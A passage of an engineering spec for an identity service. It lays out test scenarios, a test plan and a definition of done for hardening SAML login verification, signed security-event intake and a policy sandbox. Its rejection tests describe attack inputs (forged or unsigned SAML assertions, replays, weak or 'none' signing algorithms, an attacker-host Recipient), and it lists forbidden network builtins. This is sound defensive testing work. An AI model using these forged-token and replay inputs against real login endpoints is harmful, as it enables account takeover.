**And** new user row created in `kacho_iam.users` with `email` from assertion `<saml:Subject>` and `account_id=acc_t40`
**And** `Operation` returned (async via UserService.Create) — eventual `done=true`
**And** `saml_request_state` row for `req_42` deleted (consumed)
**And** audit log: `event: saml_jit_provisioned_ok, tenant: acc_t40, idp: idp_okta_test, subject: <email>`

---

#### Scenario W3.1-40-TAMPERED-SIGNATURE — signature mismatch → 401

**ID**: W3.1-40-TAMPERED

**Given** same setup as W3.1-40-HAPPY
**And** Response XML body modified after signing (e.g. `email` attribute changed) → signature no longer matches

**When** POST `/saml/v2/acs?tenant=acc_t40&idp=idp_okta_test`

**Then** HTTP 401 Unauthorized
**And** audit log: `event: saml_signature_invalid, tenant: acc_t40, idp: idp_okta_test`
**And** no row in `kacho_iam.users` for the (would-be) subject
**And** `saml_request_state` row for `req_42` NOT deleted (rejected before consume)

---

#### Scenario W3.1-40-NO-ASSERTION-SIG — Response signed but Assertion not signed → 401

**ID**: W3.1-40-NO-ASSERTION-SIG

**Given** Response is signed correctly at `<samlp:Response>` level but `<saml:Assertion>` has no `<ds:Signature>` element (XML-wrapping attack precursor)

**When** POST `/saml/v2/acs`

**Then** HTTP 401
**And** audit log: `event: saml_assertion_not_signed`
**And** rationale: per §5.40 step 2 «verify XML signature on `<samlp:Response>` AND on `<saml:Assertion>` — fail if either invalid»

---

#### Scenario W3.1-40-EXPIRED-NOTONORAFTER — stale assertion → 401

**ID**: W3.1-40-EXPIRED

**Given** Response signed correctly but `NotOnOrAfter` = now-5min (stale)

**When** POST `/saml/v2/acs`

**Then** HTTP 401
**And** audit log: `event: saml_not_on_or_after_expired`

---

#### Scenario W3.1-40-NOTBEFORE-FUTURE — premature assertion → 401

**ID**: W3.1-40-NOTBEFORE-FUTURE

**Given** Response signed correctly but `NotBefore` = now+5min (clock skew beyond ±60s tolerance)

**When** POST `/saml/v2/acs`

**Then** HTTP 401
**And** audit log: `event: saml_not_before_future`

---

#### Scenario W3.1-40-REPLAY — same Response.InResponseTo twice → 401 on second

**ID**: W3.1-40-REPLAY

**Given** Valid signed Response posted once successfully (W3.1-40-HAPPY) → `saml_request_state` row deleted

**When** POST the same Response (identical bytes) a second time

**Then** HTTP 401
**And** audit log: `event: saml_replay_rejected, request_id: req_42`
**And** the row is already absent → `crewjam/saml.RequestTracker.GetTrackedRequests` returns empty → library rejects as no matching request

---

#### Scenario W3.1-40-WEAK-ALG — rsa-sha1 signature → 401

**ID**: W3.1-40-WEAK-ALG

**Given** Response signed with `rsa-sha1` (deprecated but still common in legacy IdPs)

**When** POST `/saml/v2/acs`

**Then** HTTP 401
**And** audit log: `event: saml_signature_invalid, reason: weak_alg, alg: rsa-sha1`

---

#### Scenario W3.1-40-WRONG-RECIPIENT — Recipient ≠ our ACS URL → 401

**ID**: W3.1-40-WRONG-RECIPIENT

**Given** Response signed correctly but `<saml:SubjectConfirmationData Recipient="https://attacker.com/acs">`

**When** POST `/saml/v2/acs` (our URL)

**Then** HTTP 401
**And** audit log: `event: saml_recipient_mismatch, expected: <ours>, got: https://attacker.com/acs`

---

#### Scenario W3.1-40-WRONG-AUDIENCE — Audience ≠ our SP entity-ID → 401

**ID**: W3.1-40-WRONG-AUDIENCE

**Given** Response signed correctly but `<saml:AudienceRestriction><saml:Audience>https://other-sp.example.com</saml:Audience></saml:AudienceRestriction>` (not our SP entity-ID)

**When** POST `/saml/v2/acs`

**Then** HTTP 401
**And** audit log: `event: saml_audience_mismatch, expected: <ours>, got: https://other-sp.example.com`

---

### 6.42 CAEP SET ingress verify (#42)

#### Scenario W3.1-42-VERIFY-OK — SET signed by trusted IdP → emit subject_change_outbox row

**ID**: W3.1-42-VERIFY-OK

**Given** `iam_trusted_idp_registry` row `(idp_id='idp_test_caep_emitter', iss_uri='https://test-emitter.example.com', jwks_url='https://test-emitter.example.com/.well-known/jwks.json')`
**And** `iam_trusted_idp_jwks_cache` seeded with `(idp_id='idp_test_caep_emitter', kid='test-key-1', alg='RS256', public_key_pem='<pem>')` matching test-only private key in fixture
**And** ctx has valid `X-Kacho-Hook-Token` (existing W2.B B.8 auth path — orthogonal to verify)
**And** SET JWS signed with `kid='test-key-1'`, payload contains `iss=https://test-emitter.example.com`, `events={https://schemas.openid.net/secevent/caep/event-type/session-revoked: {subject: {sub_id: usr_t42}}}`

**When** POST `/iam/v1/hooks/caep` with header `Content-Type: application/secevent+jwt`, body = `<JWS>`

**Then** HTTP 200 OK
**And** new row in `subject_change_outbox` for `usr_t42` with `change_type='session_revoked'`, `source='caep_ingress'`, `source_idp='idp_test_caep_emitter'`
**And** audit log: `event: caep_ingress_verified_ok, idp_id: idp_test_caep_emitter, sub_id: usr_t42`

---

#### Scenario W3.1-42-VERIFY-BADSIG — tampered SET → 400 + audit

**ID**: W3.1-42-VERIFY-BADSIG

**Given** same setup as W3.1-42-VERIFY-OK
**And** SET JWS payload modified after signing (e.g. `sub_id` changed) → signature no longer matches

**When** POST `/iam/v1/hooks/caep` with tampered body

**Then** HTTP 400
**And** audit log: `event: caep_ingress_signature_invalid, idp_id: idp_test_caep_emitter`
**And** no row in `subject_change_outbox`
**And** no revocation effect — defends against forged session-revocation

---

#### Scenario W3.1-42-UNKNOWN-KID — SET signed by unregistered kid → refresh cache once → still unknown → reject

**ID**: W3.1-42-UNKNOWN-KID

**Given** Cache contains only `(idp_test_caep_emitter, test-key-1)`
**And** SET signed with `kid='unknown-key-99'` (different key, never registered)
**And** Test stub for `https://test-emitter.example.com/.well-known/jwks.json` returns only `test-key-1` (refresh doesn't help — key is genuinely unknown upstream)

**When** POST `/iam/v1/hooks/caep`

**Then** HTTP 400
**And** verify path called `jwksVerifier.FetchAndCache(...)` exactly once (refresh attempt), then rejected
**And** audit log: `event: caep_ingress_unknown_kid, idp_id: idp_test_caep_emitter, kid: unknown-key-99`

---

#### Scenario W3.1-42-WEAK-ALG — symmetric alg rejected

**ID**: W3.1-42-WEAK-ALG

**Given** SET JWS with header `alg='HS256'` (symmetric — implies shared secret with upstream, never our trust model) OR `alg='none'`

**When** POST `/iam/v1/hooks/caep`

**Then** HTTP 400
**And** audit log: `event: caep_ingress_weak_alg, alg: HS256` (or `none`)
**And** signature verification never attempted (early reject in `Verify` step 2)

---

#### Scenario W3.1-42-EXPIRED-CACHE — cache TTL expired → refresh on demand → continue

**ID**: W3.1-42-EXPIRED-CACHE

**Given** Cache row `(idp_test_caep_emitter, test-key-1)` has `expires_at < now()`
**And** Upstream JWKS endpoint still returns the same key (no upstream rotation)
**And** SET signed with `kid='test-key-1'` (valid)

**When** POST `/iam/v1/hooks/caep`

**Then** verify path detected expired cache → called `FetchAndCache(...)` → updated `expires_at` → re-tried lookup → success
**And** HTTP 200 OK
**And** `iam_trusted_idp_jwks_cache.fetched_at` for that row updated (verified)

---

#### Scenario W3.1-42-NO-LEAK — verify path never accesses egress private keys

**ID**: W3.1-42-NO-LEAK

**Given** `oidc_jwks_keys` (W2.B B.8 egress signing private keys) contains active row
**And** `iam_trusted_idp_jwks_cache` contains cached external IdP public keys (W3.1 ingress side)

**When** Multiple SETs verified through `parseSETBody` over 100 requests

**Then** Sql-trace assertion: `Verify(...)` never SELECTs from `oidc_jwks_keys` (only `iam_trusted_idp_jwks_cache`)
**And** Test asserts that even if `oidc_jwks_keys` contained an entry with the same `kid` as an external IdP, ingress verify would NOT pick it up (physical-table separation enforced)
**And** No log line contains substring `BEGIN RSA PRIVATE` / `private_key_pem` / `master_key`

---

## 7. Test plan

### 7.1 Per-finding integration tests (testcontainers)

| Finding | Test file (kacho-iam) | Tests |
|---|---|---|
| #21 | `internal/service/opa_scope/allowlist_integration_test.go` | `Test_OpaScope_Allowed_Happy`, `Test_OpaScope_UnknownScope_Denied`, `Test_OpaScope_EmptyAllowlist_FailsClosed` |
| #23 | `internal/service/authorize_service_checkrelation_test.go` | `Test_CheckRelation_Context_HappyMfa`, `Test_CheckRelation_Context_DenyOnFalse`, `Test_CheckRelation_OversizedKeys_InvalidArgument`, `Test_CheckRelation_OversizedValue_InvalidArgument` |
| #25 | `internal/apps/kacho/api/internal_authorize/handler_reloadmodel_test.go` | `Test_ReloadModel_ClusterAdmin_HappyPath`, `Test_ReloadModel_Anonymous_PermissionDenied`, `Test_ReloadModel_NonAdmin_PermissionDenied` |
| #26 | `internal/apps/kacho/api/internal_authorize/handler_runregotest_test.go` | `Test_RunRegoTest_Happy_Bounded`, `Test_RunRegoTest_ForbiddenBuiltinHttpSend_Rejected`, `Test_RunRegoTest_AllForbiddenBuiltins_TableTest`, `Test_RunRegoTest_AllowedPureBuiltins_TableTest`, `Test_RunRegoTest_CpuTimeout_Exceeded`, `Test_RunRegoTest_UnknownImport_Denied`, `Test_RunRegoTest_NonAdmin_PermissionDenied` |
| #40 | `internal/apps/kacho/api/saml/sp_handler_integration_test.go` | `Test_SAML_HappyVerifyAndJIT`, `Test_SAML_TamperedSignature_Rejected`, `Test_SAML_NoAssertionSignature_Rejected`, `Test_SAML_ExpiredNotOnOrAfter_Rejected`, `Test_SAML_NotBeforeFuture_Rejected`, `Test_SAML_Replay_Rejected`, `Test_SAML_WeakAlgRsaSha1_Rejected`, `Test_SAML_WrongRecipient_Rejected`, `Test_SAML_WrongAudience_Rejected`, `Test_SAML_MultiIdpRoutingByIssuer` |
| #42 | `internal/service/jwks_verifier/verifier_integration_test.go` + `internal/handler/iamhooks/caep_ingress_handler_integration_test.go` | `Test_JwksVerifier_FetchAndCache_Happy`, `Test_JwksVerifier_Verify_HappyRS256`, `Test_JwksVerifier_TamperedSig_Rejected`, `Test_JwksVerifier_WeakAlg_Rejected`, `Test_JwksVerifier_UnknownKid_RefreshAndReject`, `Test_JwksVerifier_ExpiredCache_RefreshAndPass`, `Test_CAEP_Ingress_VerifyOk_EmitsOutbox`, `Test_CAEP_Ingress_BadSig_Rejects_NoOutbox`, `Test_CAEP_Ingress_UnknownIssuer_Rejects`, `Test_CAEP_Ingress_NoLeakFromEgressKeys` |

All tests testcontainers Postgres (current migrations); OpenFGA testcontainer for #23 / #25 / #26 (cluster-admin check uses real FGA; #23 uses Conditions feature). #40 SAML fixture: pre-generated test cert + assertion fixtures committed under `internal/apps/kacho/api/saml/testdata/`. #42 CAEP: RSA 2048 keygen on test setup (~50ms), real signed JWTs, real JWS verify via `golang-jwt/jwt/v5`; HTTP JWKS endpoint via test stub server (in-process).

### 7.2 Newman E2E cases

Fixture requirements:
- **#21 (OPA scope-allowlist)**: standard fixture (auth-fixtures setup.sh) + admin-authenticated user with cluster-admin grant. Newman cases: `OPA-SCOPE-ALLOWLISTED-OK`, `OPA-SCOPE-UNKNOWN-403`, `OPA-SCOPE-EMPTY-ALLOWLIST-FAILCLOSED` (uses fixture that DROPs seed before run).
- **#23 (CheckRelation context)**: requires conditional binding fixture — extend `authz-fixtures/setup.sh` to seed FGA model with `mfa_fresh_required` Condition and a binding using it. Newman cases: `CHECKRELATION-CTX-MFA-ALLOW`, `CHECKRELATION-CTX-MFA-DENY`, `CHECKRELATION-CTX-OVERSIZE-400`.
- **#25 (ReloadModel)**: cases `RELOAD-MODEL-CLUSTER-ADMIN-OK`, `RELOAD-MODEL-ANON-401`, `RELOAD-MODEL-NON-ADMIN-403`.
- **#26 (RunRegoTest)**: cases `RUNREGOTEST-HAPPY`, `RUNREGOTEST-HTTP-SEND-BLOCKED`, `RUNREGOTEST-CPU-TIMEOUT`, `RUNREGOTEST-UNKNOWN-IMPORT-DENIED`, `RUNREGOTEST-NON-ADMIN-403`, `RUNREGOTEST-PURE-BUILTIN-ALLOWED` (e.g. `crypto.hmac.sha256` proof).
- **#40 SAML**: **needs fixture IdP** — DEC-W3.1-3 + OQ context. Recommend either:
  - **Option A (recommended)**: pre-generated test cert + raw XML AuthnResponse fixtures committed under `tests/newman/fixtures/saml/`. Newman script POSTs raw XML to ACS endpoint; no live IdP needed. Simplest, used by `crewjam/saml`'s own test suite.
  - **Option B**: Kratos OIDC stub container in newman test-stack — orchestration complexity outweighs benefit for W3.1. Defer to W3.4 freeze if e2e-live SSO needed.
- **#42 CAEP ingress**: needs **synthetic IdP** stub (in-process HTTP server) serving a JWKS endpoint with test public key + helper that signs test SETs with paired private key. Newman cases: `CAEP-INGRESS-VERIFIED-OK`, `CAEP-INGRESS-BADSIG-400`, `CAEP-INGRESS-UNKNOWN-KID-400`, `CAEP-INGRESS-WEAK-ALG-400`, `CAEP-INGRESS-UNKNOWN-ISSUER-400`.

### 7.3 RED→GREEN evidence per finding

Per Запрет #12 strict test-first. PR description must include for each finding:

| Finding | RED commit | GREEN commit | RED test output | GREEN test output |
|---|---|---|---|---|
| #21 | `red(#21): opa-scope-allowlist tests` | `green(#21): impl + migration` | `Test_OpaScope_UnknownScope_Denied: handler does not check allowlist (200 instead of 403)` | `... PASS` |
| #23 | `red(#23): checkrelation conditions tests` | `green(#23): plumb Context map` | `Test_CheckRelation_Context_HappyMfa: assertion failed: Context nil` | `... PASS` |
| #25 | `red(#25): reloadmodel auth tests` | `green(#25): cluster-admin gate` | `Test_ReloadModel_NonAdmin_PermissionDenied: got OK, want PermissionDenied` | `... PASS` |
| #26 | `red(#26): runregotest sandbox tests` | `green(#26): sandbox + cpu/import allowlist` | `Test_RunRegoTest_ForbiddenBuiltinHttpSend_Rejected: got Allowed=true, want forbidden builtin` | `... PASS` |
| #40 | `red(#40): saml verify tests` | `green(#40): impl crewjam wiring + replay store` | `Test_SAML_TamperedSignature_Rejected: got 302, want 401` | `... PASS` |
| #42 | `red(#42): caep ingress verify tests` | `green(#42): jwks_verifier package + parseSETBody integration` | `Test_CAEP_Ingress_BadSig_Rejects_NoOutbox: got 200 + outbox row, want 400 + no outbox` | `... PASS` |

### 7.4 Anti-leak property tests (always-on regression)

- `Test_CAEP_Ingress_NeverAccessesEgressPrivateKeys` — SQL-trace assertion: throughout 100 ingress-verify requests, no SELECT against `oidc_jwks_keys`; only `iam_trusted_idp_jwks_cache` and `iam_trusted_idp_registry`. Runs on every CI.
- `Test_SAML_AuditLogContainsNoRawAttackerInput` — for each `saml_signature_invalid` case, assert audit log fields contain only `tenant`, `idp`, hash-fingerprint of response — never raw email/subject from attacker-controlled body (prevent log injection).
- `Test_CAEP_AuditLogContainsNoRawTokenBody` — for each `caep_ingress_signature_invalid` case, assert audit log does not contain the verbatim JWS body (could include attacker-supplied JSON payload). Only `err`, `idp_id`, `iss` (extracted post-decode, pre-verify — `iss` is also attacker-controlled but bounded-length URL).

### 7.5 Cross-suite coverage check

`tests/newman/coverage.py --min 100` (W0.1 gate) — extension of `RunRegoTest` proto (new fields) must add ≥1 happy + ≥1 negative newman case; modifications to existing handlers (ReloadModel, CheckRelation, SAML ACS, CAEP ingress) must each have RED→GREEN newman pair. Coverage gate fails CI if not.

---

## 8. Definition of Done

### Per-finding DoD

- [ ] **#21**: `opa_scope_allowlist` table created (migration assigned at impl-start); bootstrap-seed for `data.iam.{users,roles,bindings,projects}` present; handler enforces in `RunRegoTest.module_imports[]`; empty-allowlist fails-closed; integration tests + newman cases GREEN; structured log emits `opa_scope_not_allowlisted` on denies.
- [ ] **#23**: `CheckRelation` plumbs `request_context` to OpenFGA `Context` map (Conditions feature); size-cap (32 keys, 1KB/value) enforced with `InvalidArgument`; FGA model extended with sample condition (`mfa_fresh_required`); conditional binding ABAC scenario allow/deny depending on context; integration test confirms FGA Check called with non-nil `Context`.
- [ ] **#25**: `ReloadModel` requires cluster-admin grant; anonymous → `PermissionDenied("authentication required")`; non-admin authenticated → `PermissionDenied("ReloadModel requires cluster-admin grant")`; cluster-admin → succeeds + audit log; same applied to `RunRegoTest` (#26 parity).
- [ ] **#26**: Sandbox enforces 4 dimensions (parser deny-list / CPU timeout / iteration-cap-as-memory-proxy / import allowlist); table-test covers all forbidden built-ins (`http.send`, `time.now_ns`, `net.lookup_ip_addr`, `opa.runtime`, `rand.*`); separate table-test covers allowed pure-computation builtins (`io.jwt.decode`, `crypto.hmac.*`, `base64.*`); CPU timeout test asserts deadline fires within ±50ms of configured; doc-comment in `walkForForbiddenBuiltins` explains per-builtin rationale honestly (incl. DEC-W3.1-2 framing about absent hard-memory-cap).
- [ ] **#40**: SAML AuthnResponse verification implements all 8 checks (signature on Response / signature on Assertion / algo allowlist / InResponseTo / NotBefore / NotOnOrAfter / Recipient / Audience); replay store (`saml_request_state`) prevents double-consume via PK delete-on-consume; rsa-sha1 explicitly rejected; tampered signature → 401; JIT-provisioning generates `Operation` (async via `UserService.Create`); audit events emit for all fail-modes (incl. `saml_assertion_not_signed`, `saml_not_before_future`, `saml_audience_mismatch`); POC-verification of `crewjam/saml.ServiceProvider.AcceptedResponseSigningAlgorithms` field-name done before main impl commit.
- [ ] **#42**: `iam_trusted_idp_jwks_cache` + `iam_trusted_idp_registry` tables created; `internal/service/jwks_verifier/` package implemented (FetchAndCache + Verify); `parseSETBody` integrated with verify path (replaces «base64-decode without verify»); asymmetric alg allowlist enforced (RS*, ES*); symmetric and `none` algs rejected; unknown kid triggers single refresh attempt then rejection; expired cache triggers automatic refresh; physical-table separation verified (verify path never touches `oidc_jwks_keys`); test fixture for synthetic test-IdP committed under `tests/newman/fixtures/caep/` with readme warning «test-only key, never deploy».

### Global DoD

- [ ] `acceptance-reviewer` ✅ APPROVED данного doc; all OQs (W3.1-1..10) resolved
- [ ] Branch `KAC-W3.1` создан в `kacho-iam`, `kacho-proto` (per-repo branches in dep-order)
- [ ] **RED phase commit** (per finding, ordered): all §7.1 integration tests + §7.2 newman cases written, CI red — RED evidence in PR description per finding per §7.3
- [ ] **GREEN phase commits** (one logical commit per finding, ordered for review):
  - [ ] #21 — opa_scope_allowlist (RED W3.1-21-* → GREEN)
  - [ ] #23 — CheckRelation OpenFGA Conditions (RED W3.1-23-* → GREEN)
  - [ ] #25 — ReloadModel cluster-admin gate (RED W3.1-25-* → GREEN)
  - [ ] #26 — RunRegoTest sandbox (RED W3.1-26-* → GREEN)
  - [ ] #40 — SAML verify + replay state (RED W3.1-40-* → GREEN)
  - [ ] #42 — CAEP SET ingress verify (RED W3.1-42-* → GREEN)
- [ ] Anti-leak property tests (§7.4) GREEN
- [ ] Cross-suite coverage check (§7.5) `coverage.py --min 100` GREEN
- [ ] All 6 findings closed per remediation plan §1.3 Chunk 5 (items 5.1, 5.2, 5.3, 5.4, 5.5, 5.8 — items 5.6 [#41 → W2.B] / 5.7 [#20 → W3.3] / 5.9 [#24 → future OPA-VERIFY chunk] excluded per §0.1)
- [ ] `make e2e` smoke on dev-kind shows: cluster-admin can ReloadModel; non-admin cannot; SAML SSO works against test fixture; CAEP ingress correctly verifies via trusted IdP JWKS and rejects forged SETs
- [ ] kacho-iam CI green (unit + integration + race + newman e2e)
- [ ] kacho-proto CI green (`buf lint`, `buf breaking` — additive only on `RunRegoTest` request/response)
- [ ] No new TODO / FIXME in diff (per Запрет #11; reviewer rejects on any)
- [ ] PRs merged (kacho-proto first, then kacho-iam)
- [ ] Vault обновлён (per §9 below)
- [ ] YouTrack KAC-W3.1:
  - [ ] In Progress on impl start
  - [ ] PR links commented (per-repo: proto, iam)
  - [ ] Done on merge + smoke + newman GREEN
- [ ] W3 tracker `2026-05-23-iam-prod-ready-wave3.md` updated: W3.1 row → ✅ done + date; remaining W3.2/W3.3/W3.4 unblocked
- [ ] Master plan §«Definition of Done» updated: «44 findings closed» → 6 closer to total; «0 stub on surface» — SAML 501 guard gone, CAEP ingress «verify-stub» comment gone

---

## 9. Vault updates (per CLAUDE.md §«Vault discipline»)

### NEW notes

- **`obsidian/kacho/resources/iam-opa-scope-allowlist.md`** (NEW, 1-3KB):
  - Concept: per-tenant whitelist of legitimate OPA scope-strings for `RunRegoTest.module_imports[]` (and any future OPA-scope-accepting handler — added at registration-time per DEC-W3.1-1).
  - Storage: `kacho_iam.opa_scope_allowlist (tenant_id, scope) PK`.
  - Disambiguation from Federation `FederationTrustPolicy.allowed_scopes` (OAuth scope) per DEC-W3.1-1.
  - Bootstrap-seed: `data.iam.users/roles/bindings/projects` for `*system` tenant.
  - Gotchas: empty allowlist = fail-closed all (NOT allow-all).
  - Links: `[[../packages/iam-service-opa-scope]]`, `[[../rpc/iam-internal-authorize-service]]`.

- **`obsidian/kacho/resources/iam-saml-request-state.md`** (NEW, 1-3KB):
  - Concept: per-RequestID single-use replay protection for SAML AuthnResponses.
  - Storage: `kacho_iam.saml_request_state (request_id PK, tenant_id FK accounts, idp_id, issued_at, expires_at, relay_state)`.
  - Lifecycle: INSERT on AuthnRequest issuance (TrackRequest); DELETE on ACS successful consume; row absence on second ACS attempt → 401.
  - TTL: issued_at + 10min (OQ-W3.1-7); daily cleanup cron.
  - Links: `[[../edges/iam-to-saml-idp]]`, `[[../rpc/iam-federation-service]]`.

- **`obsidian/kacho/resources/iam-trusted-idp-jwks-cache.md`** (NEW, 1-3KB, security note):
  - Concept: cached public keys from external trusted IdPs (CAEP-emitting IdPs), used to verify INGRESS SET signatures.
  - Storage: `kacho_iam.iam_trusted_idp_jwks_cache (idp_id, kid) PK + (alg, public_key_pem, fetched_at, expires_at)` + sibling `iam_trusted_idp_registry (idp_id PK, iss_uri UNIQUE, jwks_url)`.
  - Refresh policy (DEC-W3.1-4): respect upstream Cache-Control max-age (default 1h); background refresh every 6h; refresh-on-miss handles compromise scenario.
  - Gotcha: this table is **physically separate** from `oidc_jwks_keys` (W2.B B.8 — OUR egress signing private keys). INGRESS verify (`internal/service/jwks_verifier/`) never reads `oidc_jwks_keys`; EGRESS sign (`internal/service/oidc_signer/` or equivalent in W2.B) never reads this table. Assertion enforced by Test_CAEP_Ingress_NeverAccessesEgressPrivateKeys (§7.4).
  - Links: `[[../packages/iam-service-jwks-verifier]]`, `[[../edges/iam-to-external-idp-jwks]]`, `[[../edges/iam-to-caep-ingress]]`.

- **`obsidian/kacho/packages/iam-service-opa-scope.md`** (NEW):
  - Package: `internal/service/opa_scope/`.
  - Exported: `Repo` interface (`IsAllowed(ctx, tenantID, scope) (bool, error)`); impl in `internal/repo/opa_scope_repo.go`.
  - Used by: `internal_authorize.handler` (RunRegoTest module_imports gate).
  - Links: `[[../resources/iam-opa-scope-allowlist]]`.

- **`obsidian/kacho/packages/iam-service-jwks-verifier.md`** (NEW):
  - Package: `internal/service/jwks_verifier/`.
  - Exported: `Verifier` interface (`FetchAndCache(ctx, idpID, jwksURL) error`; `Verify(ctx, idpID, token string) (jwt.MapClaims, error)`).
  - Used by: `iamhooks.CAEPIngressHandler` (parseSETBody).
  - Imports: `golang-jwt/jwt/v5`, `pgx`.
  - Internal-only — no public RPC exposure.
  - Links: `[[../resources/iam-trusted-idp-jwks-cache]]`, `[[../edges/iam-to-external-idp-jwks]]`, `[[../edges/iam-to-caep-ingress]]`.

- **`obsidian/kacho/edges/iam-to-saml-idp.md`** (NEW, 1-3KB):
  - Edge: kacho-iam (as SP) ← SAML IdP (Okta/Azure AD/etc, external).
  - Protocol: SAML 2.0 AuthnResponse POST to `/saml/v2/acs?tenant=<>&idp=<>`.
  - Sync (request-response): IdP-initiated POST → iam verifies signature → JIT-provisions user → 302 redirect.
  - Verify-stack: 8 checks (signature on Response / signature on Assertion / algo allowlist / InResponseTo / NotBefore / NotOnOrAfter / Recipient / Audience).
  - Library: `crewjam/saml` (DEC-W3.1-3 with POC-verify caveat).
  - Replay protection: `saml_request_state`-table PK on `request_id`; delete-on-consume; row absence on second attempt → 401.
  - Error handling: any verify-fail → 401 + structured audit log (`saml_signature_invalid`/`saml_replay_rejected`/etc); no JIT-provisioning attempted; no row written.
  - History: KAC-W3.1 — initial verify impl (replaces W2.B B.1 501-guard).
  - Links: `[[../resources/iam-federation-trust-policy]]`, `[[../resources/iam-saml-request-state]]`, `[[../rpc/iam-federation-service]]`.

- **`obsidian/kacho/edges/iam-to-external-idp-jwks.md`** (NEW, 1-3KB):
  - Edge: kacho-iam → external trusted IdP's `/.well-known/jwks.json` endpoint.
  - Protocol: HTTPS GET (read-only); anonymous (JWKS endpoints are public per RFC 7517).
  - Sync: HTTP request initiated by `jwks_verifier.FetchAndCache(...)` either on first miss or background refresh ticker (every 6h per DEC-W3.1-4).
  - Cache: `iam_trusted_idp_jwks_cache` table, TTL per upstream Cache-Control max-age (default 1h).
  - Failure modes: HTTP fetch error → audit log `caep_ingress_jwks_fetch_failed`; if no fallback cached key → verify fails (next ingress request retries cache fetch).
  - History: KAC-W3.1 — initial cache impl (paired with CAEP SET ingress verify #42).
  - Links: `[[../resources/iam-trusted-idp-jwks-cache]]`, `[[../edges/iam-to-caep-ingress]]`, `[[../packages/iam-service-jwks-verifier]]`.

- **`obsidian/kacho/edges/iam-to-caep-ingress.md`** (NEW, 1-3KB):
  - Edge: external CAEP-emitting IdP → kacho-iam `/iam/v1/hooks/caep` (ingress webhook).
  - Protocol: HTTPS POST with body `<JWS>`, header `Content-Type: application/secevent+jwt`; auth: `X-Kacho-Hook-Token` (existing W2.B B.8 path — orthogonal to signature verify) + JWS signature verified per W3.1 #42.
  - Sync (request-response): vendor POST → iam verifies signature via JWKS → emits `subject_change_outbox` row → 200 OK.
  - Verify-stack: (a) parse JWS header for kid+alg; (b) assert alg in asymmetric allowlist; (c) extract iss claim → lookup `iam_trusted_idp_registry`; (d) FetchAndCache JWKS if cache miss; (e) verify signature.
  - History: KAC-W3.1 — added signature verify (replaces «base64-decode without verify» from Phase 2 stub).
  - **Differs from `edges/iam-to-caep-subscribers.md`** (W2.B B.8 territory): that edge is iam→external subscribers (egress sign); this edge is external IdP→iam (ingress verify). Orthogonal directions.
  - Links: `[[../resources/iam-trusted-idp-jwks-cache]]`, `[[../packages/iam-service-jwks-verifier]]`, `[[../edges/iam-to-external-idp-jwks]]`.

### UPDATE existing notes

- **`obsidian/kacho/rpc/iam-federation-service.md`** — update §«Methods» to note SAML ACS endpoint now does full verify (drop 501-guard mention); add §«Verify-stack» summary linking to `[[../edges/iam-to-saml-idp]]`; update «History» with KAC-W3.1.
- **`obsidian/kacho/rpc/iam-internal-authorize-service.md`** — note `RunRegoTest` now sandbox-bounded (parser deny-list + CPU timeout + iteration cap + import allowlist) and cluster-admin gated; note `ReloadModel` cluster-admin gated; note scope-allowlist enforced for `module_imports[]`; link to `[[../resources/iam-opa-scope-allowlist]]`.
- **`obsidian/kacho/rpc/iam-caep-service.md`** (or `iam-caep-ingress.md` if separate) — update §«Inbound SET verification» to specify JWS verify against trusted IdP JWKS (drop «Phase 2 base64-only» mention); link to `[[../resources/iam-trusted-idp-jwks-cache]]` and `[[../edges/iam-to-caep-ingress]]`.

### NOT modified (intentional — out of W3.1 scope)

- **`obsidian/kacho/resources/iam-scim-credential.md`** (if exists) — #41 moved to W2.B B.2 (per scope split); any vault entries for SCIM Basic-auth are W2.B B.2's responsibility.
- **`obsidian/kacho/edges/iam-to-scim-clients-authn.md`** (if exists) — same: W2.B B.2 territory.
- **`obsidian/kacho/edges/iam-to-caep-subscribers.md`** (egress side, W2.B B.8) — not modified by W3.1.
- **`obsidian/kacho/resources/iam-oidc-jwks-keys.md`** (W2.B B.8 territory — OUR signing keys) — not modified by W3.1; physical-table separation maintained.

### KAC trail note

- **`obsidian/kacho/KAC/KAC-W3.1.md`** (NEW, ≤3KB, per CLAUDE.md «KAC-тикеты — обязательный trail»):
  - `Status: in-progress` (until merge → `done`)
  - `Type: epic-subtask` (subtask of master `KAC-iam-prod-ready`)
  - `Repos: kacho-iam, kacho-proto`
  - `PRs: <fill in as opened>`
  - `## Что и зачем`: 1-2 abzaca — closes 6 findings from remediation plan Chunk 5 (federation/SSO internals: OPA scope-allowlist, CheckRelation context, ReloadModel cluster-admin gate, RunRegoTest sandbox, SAML verify, CAEP SET ingress verify). #41 SCIM Basic-auth not included — lives in W2.B B.2 (per scope split Option Y, ratified per KAC-170 review report).
  - `## Затронутые сущности vault`: list of NEW + UPDATE entries above.
  - `## Acceptance / Definition of Done`: checklist from §8 above.
  - `## Связанные тикеты`: predecessors (W1.6, W2.B B.1, W2.B B.2, W2.B B.8, W2.A); siblings (W3.2 observability, W3.3 SPIRE+Cilium, W3.4 freeze); revision trail (KAC-173 — v1→v2 revision per KAC-170 review findings).
  - `#kac #epic #security`

---

## 10. Out of scope (явно — на следующие chunks)

| Что | Куда |
|---|---|
| **#41 SCIM Basic-auth** (per-tenant credentials + middleware + Basic-auth verify) | **W2.B B.2** (per Option Y scope split — master plan §W3 row excludes #41; logical co-location with SCIM endpoints lives in W2.B) |
| **#20 Port segregation NetworkPolicy** (restrict grpc-internal 9091 to cluster-internal sources) | **W3.3** (SPIRE+Cilium chunk — broader NetworkPolicy story) |
| **#24 OPA bundle resilience (gateway interceptor fail-closed verification)** | **Future «W3.1.1 follow-up» chunk** (separate KAC if needed — not in master plan §W3 row) |
| **CAEP egress signing + `/.well-known/jwks.json` publication for OUR keys** | **W2.B B.8** (egress signing — kacho-iam emits signed SETs to subscribers; W3.1 covers only inverse ingress verify) |
| Observability customisation (dashboards/alerts/metrics for anti-anon, SAML-reject, CAEP-badsig, JWKS-fetch-fail, rego-sandbox-block, opa-scope-deny) | **W3.2** |
| SPIRE + Cilium ServiceMesh wiring (kacho-iam за SVID) | **W3.3** |
| Freeze checklist (security review, pentest readiness, runbook completeness, secret rotation playbook) | **W3.4** |
| Admin-UI surfaces for `InternalOpaScopeAllowlistService.{Add,Remove,List}` | W4-admin-UI sprint |
| Admin-UI surfaces for `InternalTrustedIdpRegistryService.{Add,Remove,List}` (for #42 trusted-IdP registration) | W4-admin-UI sprint |
| Live IdP integration testing (Kratos OIDC stub container) — beyond crewjam/saml fixture-based newman tests | W3.4 freeze if needed; else deferred |
| OIDC ID-token signing (OUR token issuance — separate from CAEP egress sign; would use W2.B B.8 signing infrastructure) | future OIDC sub-phase |
